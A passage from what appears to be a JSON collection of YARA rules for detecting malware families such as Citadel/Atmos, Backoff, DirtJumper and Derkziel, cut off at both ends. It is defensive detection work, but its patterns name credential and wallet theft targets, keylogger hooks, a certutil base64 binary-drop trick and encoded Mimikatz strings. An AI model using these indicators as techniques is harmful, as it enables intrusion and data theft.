%s:%i\"\n        $amsg4 = \"IPKiller>Athena\"\n        $amsg5 = \"Athena=Shit!\"\n        $amsg6 = \"Athena-v1\"\n        $amsg7 = \"BTC wallet.dat file found\"\n        $amsg8 = \"MineCraft lastlogin file found\"\n        $amsg9 = \"Process '%s' was found and scheduled for deletion upon next reboot\"\n        $amsg10 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\"\n        // Athena-v1.8.3\n        $amsg11 = \"Rapid Connect/Disconnect\"\n        $amsg12 = \"BTC wallet.dat found,\"\n        // v1 cmds\n        $acmd1 = \":!arme\"\n        $acmd2 = \":!openurl\"\n        $acmd3 = \":!condis\"\n        $acmd4 = \":!httpcombo\"\n        $acmd5 = \":!urlblock\"\n        $acmd6 = \":!udp\"\n        $acmd7 = \":!btcwallet\"\n   \n    condition:\n        (all of ($cmd*) and 3 of ($msg*)) or (5 of ($amsg*) and 5 of ($acmd*))\n}",
  "Atmos_Malware": "rule Atmos_Malware\n{\n    \n    meta:\n        description = \"Generic Spyware.Citadel.Atmos Signature\"\n        author = \"xylitol@temari.fr\"\n        reference = \"http://www.xylibox.com/2016/02/citadel-0011-atmos.html\"\n        date = \"20/08/2016\"\n        // May only the challenge guide you\n\n    strings:\n        // Check for the presence of MZ and kutuzov license identifier\n        $MZ = {4D 5A}\n        $LKEY = \"533D9226E4C1CE0A9815DBEB19235AE4\" wide ascii\n        \n        // TokenSpy identifiers\n        $TS1 = \"X-TS-Rule-Name: %s\" wide ascii\n        $TS2 = \"X-TS-Rule-PatternID: %u\" wide ascii\n        $TS3 = \"X-TS-BotID: %s\" wide ascii\n        $TS4 = \"X-TS-Domain: %s\" wide ascii\n        $TS5 = \"X-TS-SessionID: %s\" wide ascii\n        $TS6 = \"X-TS-Header-Cookie: %S\" wide ascii\n        $TS7 = \"X-TS-Header-Referer: %S\" wide ascii\n        $TS8 = \"X-TS-Header-AcceptEncoding: %S\" wide ascii\n        $TS9 = \"X-TS-Header-AcceptLanguage: %S\" wide ascii\n        $TS10 = \"X-TS-Header-UserAgent: %S\" wide ascii\n        \n        // Hidden VNC identifiers\n        $VNC1 = \"_hvnc_init@4\" wide ascii\n        $VNC2 = \"_hvnc_uninit@0\" wide ascii\n        $VNC3 = \"_hvnc_start@8\" wide ascii\n        $VNC4 = \"_hvnc_stop@0\" wide ascii\n        $VNC5 = \"_hvnc_wait@0\" wide ascii\n        $VNC6 = \"_hvnc_work@0\" wide ascii\n        \n        // Browsers identifiers\n        $WB1 = \"nspr4.dll\" wide ascii\n        $WB2 = \"nss3.dll\" wide ascii\n        $WB3 = \"chrome.dll\" wide ascii\n        $WB4 = \"Internet Explorer\" wide ascii\n        $WB5 = \"Firefox\" wide ascii\n        $WB6 = \"Chrome\" wide ascii\n\n    condition:\n    ($MZ at 0 and $LKEY) and ( (5 of ($TS*) and all of ($WB*)) or (3 of ($VNC*) and all of ($WB*)))\n    and filesize < 300KB // Standard size (raw from builder) should be arround ~264kb\n        // Remove the above line if you want to trig also on memory dumps, etc...\n}",
  "Atmos_Packed_Malware": "rule Atmos_Packed_Malware \n{\n   \n    meta:\n    description = \"Second Generic Spyware.Citadel.Atmos signture when builder add a packed layer\"\n    author = \"xylitol@temari.fr\"\n    reference = \"http://www.xylibox.com/2016/02/citadel-0011-atmos.html\"\n    date = \"20/08/2016\"\n    // May only the challenge guide you\n\n    strings:\n        $MZ = {4D 5A}\n        // Entry point identifier with CreateThread pointer in '??' \n        $a = {55 8B EC 83 EC 0C 53 56 8B 35 ?? ?? ?? 00 57 33 DB BF 00 28 00 00}\n        // End of main proc with sleep value in '??' and api call to sleep in '??'\n        $b = {68 ?? ?? ?? ?? FF 15 ?? ?? ?? 00 E9 62 FF FF FF E8 69 10 FE FF 5F 5E 5B C9 C3}\n        // API String identifier (ShellExecuteExW, SHELL32.dll, GetUserNameExW, Secur32.dll)\n        $c = {53 68 65 6C 6C 45 78 65 63 75 74 65 45 78 57 00 53 48 45 4C 4C 33 32 2E 64 6C 6C 00 1E 00 47 65}\n        $d = {74 55 73 65 72 4E 61 6D 65 45 78 57 00 00 53 65 63 75 72 33 32 2E 64 6C 6C 00 10 00}\n        // New Thread identifier\n        $e = {55 8B EC 83 E4 F8 83 EC 1C 83 7D 08 00 57 74 ?? 6A FF FF 75 08 FF 15 ?? ?? ?? 00}\n\n    condition:\n    all of them and filesize < 300KB // Standard size (raw from builder) should be arround ~264kb\n        // Remove the above line if you want to trig also on memory dumps, etc...\n}",
  "Atmos_Builder": "rule Atmos_Builder\n{\n    \n    meta:\n        description = \"Generic signature for Hacktool.Atmos.Builder cracked version\"\n        author = \"xylitol@temari.fr\"\n        reference = \"http://www.xylibox.com/2016/02/citadel-0011-atmos.html\"\n        date = \"20/08/2016\"\n        // May only the challenge guide you\n\n    strings:\n        // Check for the presence of MZ, kutuzov license identifier, and good hardware ID\n        $MZ = {4D 5A}\n        $LKEY = \"533D9226E4C1CE0A9815DBEB19235AE4\" wide ascii\n        $HWID = \"D19FC0FB14BE23BCF35DA427951BB5AE\" wide ascii\n\n        // Builder strings identifiers\n        $s1 = \"url_loader=%S\" wide ascii\n        $s2 = \"url_webinjects=%S\" wide ascii\n        $s3 = \"url_tokenspy=%S\" wide ascii\n        $s4 = \"file_webinjects=%S\" wide ascii\n        $s5 = \"moneyparser.enabled=%u\" wide ascii\n        $s6 = \"enable_luhn10_post=%u\" wide ascii\n        $s7 = \"insidevm_enable=%u\" wide ascii\n        $s8 = \"disable_antivirus=%u\" wide ascii\n        \n    condition:\n        $MZ at 0 and $LKEY and $HWID and all of ($s*)\n}",
  "custom_ssh_backdoor_server": "rule custom_ssh_backdoor_server\n{\n\n    meta:\n        description = \"Custome SSH backdoor based on python and paramiko - file server.py\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/S46L3o\"\n        date = \"2015-05-14\"\n        hash = \"0953b6c2181249b94282ca5736471f85d80d41c9\"\n\n    strings:\n        $s0 = \"command= raw_input(\\\"Enter command: \\\").strip('n')\" fullword ascii\n        $s1 = \"print '[-] (Failed to load moduli -- gex will be unsupported.)'\" fullword ascii\n        $s2 = \"print '[-] Listen/bind/accept failed: ' + str(e)\" fullword ascii\n        $s3 = \"chan.send(command)\" fullword ascii\n        $s4 = \"print '[-] SSH negotiation failed.'\" fullword ascii\n        $s5 = \"except paramiko.SSHException, x:\" fullword ascii\n\n    condition:\n        filesize < 10KB and 5 of them\n}",
  "backoff": "rule backoff \n{\n\n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2014-08-21\"\n        description = \"Identify Backoff\"\n\n    strings:\n        $s1 = \"&op=%d&id=%s&ui=%s&wv=%d&gr=%s&bv=%s\"\n        $s2 = \"%s @ %s\"\n        $s3 = \"Upload KeyLogs\"\n\n    condition:\n        all of them\n}",
  "BangatCode": "rule BangatCode\n{\n    \n    meta:\n        description = \"Bangat code features\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-10\"\n    \n    strings:\n        // dec [ebp + procname], push eax, push edx, call get procaddress\n        $ = { FE 4D ?? 8D 4? ?? 50 5? FF }\n    \n    condition:\n        any of them\n}",
  "BangatStrings": "rule BangatStrings\n{\n    \n    meta:\n        description = \"Bangat Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-10\"\n        \n    strings:\n        $lib1 = \"DreatePipe\"\n        $lib2 = \"HetSystemDirectoryA\"\n        $lib3 = \"SeleaseMutex\"\n        $lib4 = \"DloseWindowStation\"\n        $lib5 = \"DontrolService\"\n        $file = \"~hhC2F~.tmp\"\n        $mc = \"~_MC_3~\"\n\n    condition:\n       all of ($lib*) or $file or $mc\n}",
  "Bangat": "rule Bangat\n{\n    meta:\n        description = \"Bangat\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-10\"\n        \n    condition:\n        BangatCode or BangatStrings\n}",
  "Batel_export_function": "rule Batel_export_function\n{\n\n    meta:\n        author = \"@j0sm1\"\n        date = \"2016/10/15\"\n        description = \"Batel backdoor\"\n        reference = \"https://www.symantec.com/security_response/writeup.jsp?docid=2016-091923-4146-99\"\n        filetype = \"binary\"\n\n    condition:\n        pe.exports(\"run_shell\") and pe.imports(\"kernel32.dll\",\"GetTickCount\") and pe.imports(\"kernel32.dll\",\"IsDebuggerPresent\") and pe.imports(\"msvcr100.dll\",\"_crt_debugger_hook\") and pe.imports(\"kernel32.dll\",\"TerminateProcess\") and pe.imports(\"kernel32.dll\",\"UnhandledExceptionFilter\")\n}",
  "BlackRev": "rule BlackRev\n{\n   meta:\n      author = \"Dennis Schwarz\"\n      date = \"2013-05-21\"\n      description = \"Black Revolution DDoS Malware. http://www.arbornetworks.com/asert/2013/05/the-revolution-will-be-written-in-delphi/\"\n      origin = \"https://github.com/arbor/yara/blob/master/blackrev.yara\"\n\n   strings: \n      $base1 = \"http\"\n      $base2 = \"simple\"\n      $base3 = \"loginpost\"\n      $base4 = \"datapost\"\n\n      $opt1 = \"blackrev\"\n      $opt2 = \"stop\"\n      $opt3 = \"die\"\n      $opt4 = \"sleep\"\n      $opt5 = \"syn\"\n      $opt6 = \"udp\"\n      $opt7 = \"udpdata\"\n      $opt8 = \"icmp\"\n      $opt9 = \"antiddos\"\n      $opt10 = \"range\"\n      $opt11 = \"fastddos\"\n      $opt12 = \"slowhttp\"\n      $opt13 = \"allhttp\"\n      $opt14 = \"tcpdata\"\n      $opt15 = \"dataget\"\n\n   condition:\n      all of ($base*) and 5 of ($opt*)\n}",
  "BlackWorm": "rule BlackWorm\n{\n\n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2015-05-20\"\n        description = \"Identify BlackWorm\"\n\n    strings:\n        $str1 = \"m_ComputerObjectProvider\"\n        $str2 = \"MyWebServices\"\n        $str3 = \"get_ExecutablePath\"\n        $str4 = \"get_WebServices\"\n        $str5 = \"My.WebServices\"\n        $str6 = \"My.User\"\n        $str7 = \"m_UserObjectProvider\"\n        $str8 = \"DelegateCallback\"\n        $str9 = \"TargetMethod\"\n        $str10 = \"000004b0\" wide\n        $str11 = \"Microsoft Corporation\" wide\n\n    condition:\n        all of them\n}",
  "BoousetCode": "rule BoousetCode\n{\n    \n    meta:\n        description = \"Boouset code tricks\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-19\"\n        \n    strings:\n        $boousetdat = { C6 ?? ?? ?? ?? 00 62 C6 ?? ?? ?? ?? 00 6F C6 ?? ?? ?? ?? 00 6F C6 ?? ?? ?? ?? 00 75 }\n        \n    condition:\n        any of them\n}",
  "Bublik": "rule Bublik\n{\n   \n    meta:\n        author=\"Kevin Falcoz\"\n        date=\"29/09/2013\"\n        description=\"Bublik Trojan Downloader\"\n        \n    strings:\n        $signature1={63 6F 6E 73 6F 6C 61 73}\n        $signature2={63 6C 55 6E 00 69 6E 66 6F 2E 69 6E 69}\n        \n    condition:\n        $signature1 and $signature2\n}",
  "Win32_Buzus_Softpulse": "rule Win32_Buzus_Softpulse\n{\n\n    meta:\n        description = \"Trojan Buzus / Softpulse\"\n        author = \"Florian Roth\"\n        date = \"2015-05-13\"\n        hash = \"2f6df200e63a86768471399a74180466d2e99ea9\"\n        score = 75\n\n    strings:\n        $x1 = \"pi4izd6vp0.com\" fullword ascii\n        $s1 = \"SELECT * FROM Win32_Process\" fullword wide\n        $s4 = \"CurrentVersion\\\\Uninstall\\\\avast\" fullword wide\n        $s5 = \"Find_RepeatProcess\" fullword ascii\n        $s6 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\\" fullword wide\n        $s7 = \"myapp.exe\" fullword ascii\n        $s14 = \"/c ping -n 1 www.google\" wide\n    \n    condition:\n        uint16(0) == 0x5a4d and ( ( $x1 and 2 of ($s*) ) or all of ($s*) )\n}",
  "CAP_HookExKeylogger": "rule CAP_HookExKeylogger\n{\n\nmeta:\n    author = \"Brian C. Bell -- @biebsmalwareguy\"\n    reference = \"https://github.com/DFIRnotes/rules/blob/master/CAP_HookExKeylogger.yar\"\n\n    strings:\n    $str_Win32hookapi = \"SetWindowsHookEx\" nocase\n    $str_Win32llkey = \"WH_KEYBOARD_LL\" nocase\n    $str_Win32key = \"WH_KEYBOARD\" nocase\n\n    condition:\n        2 of them\n}",
  "ChickenDOS": "rule ChickenDOS\n{\n\n    meta:\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        description = \"Win32-variant of Chicken ident for both dropper and dropped file\"\n        source = \"https://github.com/arbor/yara/blob/master/chicken.yara\"\n\n    strings:\n        $pdb1 = \"\\\\Chicken\\\\Release\\\\svchost.pdb\"\n        $pdb2 = \"\\\\IntergrateCHK\\\\Release\\\\IntergrateCHK.pdb\"\n        $str2 = \"fake.cf\"\n        $str3 = \"8.8.8.8\"\n        $str4 = \"Processor(%d)\\\\\"\n        $str5 = \"DbProtectSupport\"\n        $str1 = \"dm1712/`jvpnpkte/bpl\"\n        $str6 = \"InstallService NPF %d\"\n        $str7 = \"68961\"\n        $str8 = \"InstallService DbProtectSupport %d\"\n        $str9 = \"C:\\\\Program Files\\\\DbProtectSupport\\\\npf.sys\"\n   \n    condition:\n        ($pdb1 or $pdb2) and 5 of ($str*)\n}",
  "ChickenDOS_Linux": "rule ChickenDOS_Linux \n{\n \n    meta:\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        description = \"Linux-variant of Chicken ident for both dropper and dropped file\"\n        source = \"https://github.com/arbor/yara/blob/master/chicken.yara\"\n    \n    strings:\n        $cfg = \"fake.cfg\"\n        $file1 = \"ThreadAttack.cpp\"\n        $file2 = \"Fake.cpp\"\n        $str1 = \"dns_array\"\n        $str2 = \"DomainRandEx\"\n        $str3 = \"cpu %llu %llu %llu %llu\"\n        $str4 = \"[ %02d.%02d %02d:%02d:%02d.%03ld ] [%lu] [%s] %s\" ascii\n    \n    condition:\n        $cfg and all of ($file*) and 3 of ($str*)\n}",
  "citadel13xy": "rule citadel13xy\n{\n    \n    meta:\n        author = \"Jean-Philippe Teissier / @Jipe_\"\n        description = \"Citadel 1.5.x.y trojan banker\"\n        date = \"2013-01-12\" \n        version = \"1.0\" \n        filetype = \"memory\"\n   \n    strings:\n        $a = \"Coded by BRIAN KREBS for personnal use only. I love my job & wife.\"\n        $b = \"http://%02x%02x%02x%02x%02x%02x%02x%02x.com/%02x%02x%02x%02x/%02x%02x%02x%02x%02x.php\"\n        $c = \"%BOTID%\"\n        $d = \"%BOTNET%\"\n        $e = \"cit_video.module\"\n        $f = \"bc_remove\"\n        $g = \"bc_add\"\n        $ggurl = \"http://www.google.com/webhp\"\n\n    condition:\n        3 of them\n}",
  "Citadel_Malware": "rule Citadel_Malware\n{\n    \n    meta:\n        author = \"xylitol@temari.fr\"\n        date = \"2015-10-08\" \n        description = \"Search for nss3.dll pattern indicating an hexed copy of Citadel malware to work on firefox > v23.0\"\n        // May only the challenge guide you\n        \n    strings:\n        $s1 = \"Coded by BRIAN KREBS for personal use only. I love my job & wife\" wide ascii\n        $s2 = \"nss3.dll\" wide ascii\n\n        $h1 = {8B C7 EB F5 55 8B EC}\n        $h2 = {55 8B EC 83 EC 0C 8A 82 00 01 00 00}\n        $h3 = {3D D0 FF 1F 03 77 ?? 83 7D}\n        $h4 = {83 F9 66 74 ?? 83 F9 6E 74 ?? 83 F9 76 74 ?? 83 F9 7A}\n\n    condition:\n        all of ($s*) and 2 of ($h*)\n}",
  "Binary_Drop_Certutil": "rule Binary_Drop_Certutil\n{\n\n    meta:\n        description = \"Drop binary as base64 encoded cert trick\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/9DNn8q\"\n        date = \"2015-07-15\"\n        score = 70\n\n    strings:\n        $s0 = \"echo -----BEGIN CERTIFICATE----- >\" ascii\n        $s1 = \"echo -----END CERTIFICATE----- >>\" ascii\n        $s2 = \"certutil -decode \" ascii\n  \n    condition:\n        filesize < 10KB and all of them\n}",
  "StegoKatz": "rule StegoKatz \n{\n\n    meta:\n        description = \"Encoded Mimikatz in other file types\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/jWPBBY\"\n        date = \"2015-09-11\"\n        score = 70\n\n    strings:\n        $s1 = \"VC92Ny9TSXZMNk5jLy8vOUlqUTFVRlFNQTZMLysvdjlJaTh2L0ZUNXJBUUJJaTFRa1NFaUx6K2hWSS8vL1NJME44bklCQU9pZC92Ny9USTJjSkpBQUFBQXp3RW1MV3hCSmkyc1lTWXR6S0VtTDQxL0R6TXhNaTl4SmlWc0lUWWxMSUUySlF4aFZWbGRCVkVGVlFWWkJWMGlCN1BBQUFBQklnMlFrYUFDNE1BQUFBRW1MNkVTTmNPQ0pSQ1JnaVVRa1pFbU5RN0JKaTlsTWpRWFBGQU1BU0ls\" ascii\n        $s2 = \"Rpd3ovN3FlalVtNklLQ0xNNGtOV1BiY0VOVHROT0Zud25CWGN0WS9BcEdMR28rK01OWm85Nm9xMlNnY1U5aTgrSTBvNkFob1FOTzRHQWdtUElEVmlqald0Tk90b2FmN01ESWJUQkF5T0pYbTB4bFVHRTBZWEFWOXVoNHBkQnRrS0VFWWVBSEE2TDFzU0c5a2ZFTEc3QWd4WTBYY1l3ZzB6QUFXS09JZE9wQVhEK3lnS3lsR3B5Q1ljR1NJdFNseGZKWUlVVkNFdEZPVjRJUldERUl1QXpKZ2pCQWdsd0Va\" ascii\n   \n    condition:\n        filesize < 1000KB and 1 of them\n}",
  "CookiesStrings": "rule CookiesStrings\n{\n    meta:\n        description = \"Cookies Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-20\"\n        \n    strings:\n        $zip1 = \"ntdll.exePK\"\n        $zip2 = \"AcroRd32.exePK\"\n        $zip3 = \"Setup=ntdll.exe\\x0d\\x0aSilent=1\\x0d\\x0a\"\n        $zip4 = \"Setup=%temp%\\\\AcroRd32.exe\\x0d\\x0a\"\n        $exe1 = \"Leave GetCommand!\"\n        $exe2 = \"perform exe success!\"\n        $exe3 = \"perform exe failure!\"\n        $exe4 = \"Entry SendCommandReq!\"\n        $exe5 = \"Reqfile not exist!\"\n        $exe6 = \"LeaveDealUpfile!\"\n        $exe7 = \"Entry PostData!\"\n        $exe8 = \"Leave PostFile!\"\n        $exe9 = \"Entry PostFile!\"\n        $exe10 = \"\\\\unknow.zip\" wide ascii\n        $exe11 = \"the url no respon!\"\n        \n    condition:\n      (2 of ($zip*)) or (2 of ($exe*))\n}",
  "Cookies": "rule Cookies\n{\n    meta:\n        description = \"Cookies\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-20\"\n        \n    condition:\n        CookiesStrings\n}",
  "CorkowDLL": "rule CorkowDLL\n{\n\n    meta:\n        description = \"Rule to detect the Corkow DLL files\"\n        reference = \"IB-Group | http://www.group-ib.ru/brochures/Group-IB-Corkow-Report-EN.pdf\"\n\n    strings:\n        $mz = { 4d 5a }\n        $binary1 = {60 [0-8] 9C [0-8] BB ?? ?? ?? ?? [0-8] 81 EB ?? ?? ?? ?? [0-8] E8 ?? 00 00 00 [0-8] 58 [0-8] 2B C3}\n        $binary2 = {(FF75??|53)FF7510FF750CFF7508E8????????[3-9]C9C20C 00}\n        $export1 = \"Control_RunDLL\"\n        $export2 = \"ServiceMain\"\n        $export3 = \"DllGetClassObject\"\n\n    condition:\n        ($mz at 0) and ($binary1 and $binary2) and any of ($export*)\n}",
  "cxpidStrings": "rule cxpidStrings\n{\n    meta:\n        description = \"cxpid Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-23\"\n        \n    strings:\n        $ = \"/cxpid/submit.php?SessionID=\"\n        $ = \"/cxgid/\"\n        $ = \"E21BC52BEA2FEF26D005CF\"\n        $ = \"E21BC52BEA39E435C40CD8\"\n        $ = \"                   -,L-,O+,Q-,R-,Y-,S-\"\n        \n    condition:\n       any of them\n}",
  "cxpidCode": "rule cxpidCode\n{\n    meta:\n        description = \"cxpid code features\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-23\"\n    \n    strings:\n        $entryjunk = { 55 8B EC B9 38 04 00 00 6A 00 6A 00 49 75 F9 }\n    \n    condition:\n        any of them\n}",
  "Cythosia": "rule Cythosia\n{\n\n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2015-03-21\"\n        description = \"Identify Cythosia\"\n\n    strings:\n        $str1 = \"HarvesterSocksBot.Properties.Resources\" wide\n\n    condition:\n        all of them\n}",
  "DDosTf": "rule DDosTf\n{\n\nmeta:\n    author = \"benkow_ - MalwareMustDie\"\n    reference = \"http://blog.malwaremustdie.org/2016/01/mmd-0048-2016-ddostf-new-elf-windows.html\"\n    description = \"Rule to detect ELF.DDosTf infection\"\n\nstrings:\n    $st0 = \"ddos.tf\"\n    $st1 = {E8 AE BE E7 BD AE 54 43  50 5F 4B 45 45 50 49 4E 54 56 4C E9 94 99 E8 AF AF EF BC 9A 00} /*TCP_KEEPINTVL*/\n    $st2 = {E8 AE BE E7 BD AE 54 43  50 5F 4B 45 45 50 43 4E 54 E9 94 99 E8 AF AF EF BC 9A 00} /*TCP_KEEPCNT*/\n    $st3 = \"Accept-Language: zh\"\n    $st4 = \"%d Kb/bps|%d%%\"\n   \ncondition:\n    all of them\n}",
  "Derkziel": "rule Derkziel\n{\n    \n    meta:\n        description = \"Derkziel info stealer (Steam, Opera, Yandex, ...)\"\n        author = \"The Malware Hunter\"\n        filetype = \"pe\"\n        date = \"2015-11\"\n        md5 = \"f5956953b7a4acab2e6fa478c0015972\"\n        site = \"https://zoo.mlw.re/samples/f5956953b7a4acab2e6fa478c0015972\"\n        reference = \"https://bhf.su/threads/137898/\"\n    \n    strings:\n        $drz = \"{!}DRZ{!}\"\n        $ua = \"User-Agent: Uploador\"\n        $steam = \"SteamAppData.vdf\"\n        $login = \"loginusers.vdf\"\n        $config = \"config.vdf\"\n    \n    condition:\n        all of them\n}",
  "Dexter_Malware": "rule Dexter_Malware \n{\n\n    meta:\n        description = \"Detects the Dexter Trojan/Agent http://goo.gl/oBvy8b\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/oBvy8b\"\n        date = \"2015/02/10\"\n        score = 70\n\n    strings:\n        $s0 = \"Java Security Plugin\" fullword wide\n        $s1 = \"%s\\\\%s\\\\%s.exe\" fullword wide\n        $s2 = \"Sun Java Security Plugin\" fullword wide\n        $s3 = \"\\\\Internet Explorer\\\\iexplore.exe\" fullword wide\n\n    condition:\n        all of them\n}",
  "dexter_strings": "rule dexter_strings\n{\n   \n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2014-09-10\"\n        description = \"Identify Dexter POSGrabber\"\n   \n    strings:\n        $s1 = \"UpdateMutex:\"\n        $s2 = \"response=\"\n        $s3 = \"page=\"\n        $s4 = \"scanin:\"\n   \n    condition:\n        all of them\n}",
  "diamond_fox": "rule diamond_fox\n{\n   \n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2015-08-22\"\n        description = \"Identify DiamondFox\"\n   \n    strings:\n        $s1 = \"UPDATE_B\"\n        $s2 = \"UNISTALL_B\"\n        $s3 = \"S_PROTECT\"\n        $s4 = \"P_WALLET\"\n        $s5 = \"GR_COMMAND\"\n        $s6 = \"FTPUPLOAD\"\n   \n    condition:\n        all of them\n}",
  "DirtJumper_drive": "rule DirtJumper_drive\n{\n   \n    meta:\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        date = \"2013-08-26\"\n        description = \"Identify first version of drive DDoS malware\"\n        source = \"https://github.com/arbor/yara/blob/master/drive.yara\"\n   \n    strings:\n        $cmd1 = \"-get\" fullword\n        $cmd2 = \"-ip\" fullword\n        $cmd3 = \"-ip2\" fullword\n        $cmd4 = \"-post1\" fullword\n        $cmd5 = \"-post2\" fullword\n        $cmd6 = \"-udp\" fullword\n        $str1 = \"login=[1000]&pass=[1000]&password=[50]&log=[50]&passwrd=[50]&user=[50]&username=[50]&vb_login_username=[50]&vb_login_md5password=[50]\"\n        $str2 = \"-timeout\" fullword\n        $str3 = \"-thread\" fullword\n        $str4 = \" Local; ru) Presto/2.10.289 Version/\"\n        $str5 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT\"\n        $newver1 = \"-icmp\"\n        $newver2 = \"<xmp>\"\n   \n    condition:\n        4 of ($cmd*) and all of ($str*) and not any of ($newver*)\n}",
  "DirtJumper_drive2": "rule DirtJumper_drive2\n{\n   \n    meta:\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        date = \"2013-08-26\"\n        description = \"Identify newer version of drive DDoS malware\"\n        source = \"https://github.com/arbor/yara/blob/master/drive2.yara\"\n   \n    strings:\n        $cmd1 = \"-get\" fullword\n        $cmd2 = \"-ip\" fullword\n        $cmd3 = \"-ip2\" fullword\n        $cmd4 = \"-post1\" fullword\n        $cmd5 = \"-post2\" fullword\n        $cmd6 = \"-udp\" fullword\n        $str1 = \"login=[1000]&pass=[1000]&password=[50]&log=[50]&passwrd=[50]&user=[50]&username=[50]&vb_login_username=[50]&vb_login_md5password=[50]\"\n        $str2 = \"-timeout\" fullword\n        $str3 = \"-thread\" fullword\n        $str4 = \" Local; ru) Presto/2.10.289 Version/\"\n        $str5 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT\"\n        $newver1 = \"-icmp\"\n        $newver2 = \"-byte\"\n        $newver3 = \"-long\"\n        $newver4 = \"<xmp>\"\n  \n    condition:\n        4 of ($cmd*) and all of ($str*) and all of ($newver*)\n}",
  "DirtJumper_drive3": "rule DirtJumper_drive3\n{\n  \n    meta:\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        date = \"2014-03-17\"\n        description = \"Identify version of Drive DDoS malware using compromised sites\"\n        source = \"https://github.com/arbor/yara/blob/master/drive3.yara\"\n  \n    strings:\n        $cmd1 = \"-get\" fullword\n        $cmd2 = \"-ip\" fullword\n        $cmd3 = \"-ip2\" fullword\n        $cmd4 = \"-post1\" fullword\n        $cmd5 = \"-post2\" fullword\n        $cmd6 = \"-udp\" fullword\n        $str1 = \"login=[1000]&pass=[1000]&password=[50]&log=[50]&passwrd=[50]&user=[50]&username=[50]&vb_login_username=[50]&vb_login_md5password=[50]\"\n        $str2 = \"-timeout\" fullword\n        $str3 = \"-thread\" fullword\n        $str4 = \" Local; ru) Presto/2.10.289 Version/\"\n        $str5 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT\"\n        $newver1 = \"-icmp\"\n        $newver2 = \"-byte\"\n        $newver3 = \"-long\"\n        $drive3 = \"99=1\"\n  \n    condition:\n        4 of ($cmd*) and all of ($str*) and all of ($newver*) and $drive3\n}",
  "eicar": "rule eicar \n{\n\tmeta:\n\t\tdescription = \"Rule to detect Eicar pattern\"\n\t\tauthor = \"Marc Rivero | @seifreed\"\n\t\thash1 = \"275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f\"\n\n\tstrings:\n\t\t$s1 = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}",
  "Trj_Elex_Installer_NSIS": "rule Trj_Elex_Installer_NSIS \n{\n   \n    meta:\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        description = \"Elex Installer NSIS\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        \n    strings:\n        $mz = { 4d 5a }\n        $str1 = {4e 75 6c 6c 73 6f 66 74 }\n        $str2 = {b7 a2 d5 dc 0c d6 a6 3a}\n        \n    condition:\n        ($mz at 0) and ($str1 at 0xA008) and ($str2 at 0x1c8700)\n}",
  "Trj_Elex_Installer": "rule Trj_Elex_Installer \n{\n\n    meta:\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        description = \"Elex Installer\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        \n    strings:\n        $mz = { 4d 5a }\n        $str1 = {65 00 76 00 65 00 72 00 79 00 74 00 68 00 69 00 6e 00 67 00}\n        $str2 = \"IsWow64Process\"\n        $str3 = \"SSFK\"\n        \n    condition:\n        ($mz at 0) and ($str1) and ($str2) and ($str3)\n}",
  "Trj_Elex_Service32": "rule Trj_Elex_Service32 \n{\n\n    meta:\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        description = \"Elex Service 32 bits\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        \n    strings:\n        $mz = { 4d 5a }\n        $str1 = \"http://xa.xingcloud.com/v4/sof-everything/\"\n        $str2 = \"http://www.mysearch123.com\"\n        $str3 = \"21e223b3f0c97db3c281da1g7zccaefozzjcktmlma\"\n        \n    condition:\n        (pe.machine == pe.MACHINE_I386) and ($mz at 0) and ($str1) and ($str2) and ($str3)\n}",
